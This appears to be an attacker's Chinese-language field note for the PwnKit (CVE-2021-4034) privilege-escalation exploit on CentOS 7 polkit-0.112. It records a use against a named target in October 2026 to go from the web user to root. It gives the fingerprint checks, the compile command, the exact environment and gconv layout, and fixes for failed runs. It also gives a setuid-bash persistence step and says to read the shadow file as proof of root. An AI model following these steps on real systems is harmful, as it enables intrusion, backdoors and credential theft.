# PwnKit berdav 原版（CentOS7 polkit-0.112）

源：https://github.com/berdav/CVE-2021-4034  
实战：国强利民 2026-10-05 www→root。

## 指纹

`pkexec version 0.112` · `rpm -q polkit` → `polkit-0.112-*.el7` · `/usr/bin/gcc` 可用。

## 必做布局（勿自创）

1. `gcc -shared -fPIC -o pwnkit.so pwnkit.c`（`gconv_init` → setuid0 + exec shell/script）。
2. 启动器 environ **精确**：
   - `pwnkit.so:.`
   - `PATH=GCONV_PATH=.`
   - `SHELL=/lol/i/do/not/exists`
   - `CHARSET=PWNKIT`
   - `GIO_USE_VFS=`
   - argv 空：`execve("/usr/bin/pkexec", {NULL}, environ)`
3. `echo 'module UTF-8// PWNKIT// pwnkit 1' > gconv-modules`
4. `mkdir GCONV_PATH=.` 且 **`cp $(which true) 'GCONV_PATH=./pwnkit.so:.'`**
5. 跑 exploit → `chmod 4755` 复制的 bash 做持久。

## 失败

- `SHELL=/bin/bash` → shells 校验 / incident reported。
- 自写 gconv 目录或空 `pwnkit` 文件 → convert / No such file。
- PATH 空 → 找不到 gcc/true；脚本头 export PATH 并用绝对路径。

## root 口径

`euid=0` + 读 panel/shadow。业务超管 ≠ root。
